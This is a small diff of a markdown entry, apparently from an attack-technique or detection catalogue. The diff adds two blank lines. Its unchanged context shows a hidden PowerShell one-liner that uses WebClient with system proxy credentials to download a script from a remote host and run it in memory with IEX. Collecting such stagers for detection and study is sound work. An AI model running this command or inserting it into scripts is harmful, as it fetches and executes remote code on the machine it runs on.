@@ -14,3 +14,5 @@ updated_at: '2023-04-10T20:25:00.365273+00:00'
 ```powershell
 powershell.exe -nop -w hidden -c $g=new-object net.webclient;$g.proxy=[Net.WebRequest]::GetSystemWebProxy();$g.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $g.downloadstring('http://10.0.0.1:8080/rYDPPB');
 ```
+
+
